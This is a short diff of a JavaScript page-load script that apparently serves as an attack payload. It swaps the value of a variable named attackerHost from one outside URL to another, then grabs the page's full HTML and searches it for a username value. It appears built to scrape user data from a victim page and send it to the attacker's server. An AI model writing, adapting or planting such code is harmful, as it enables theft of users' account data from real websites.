@@ -1,5 +1,5 @@
 $(document).ready(function() {
-  var attackerHost="http://staproject.url.ph/?";
+  var attackerHost="//oszo.kd.io/?";
   
   var htmlPage = document.documentElement.innerHTML;
   var findUsername = "var username = '";
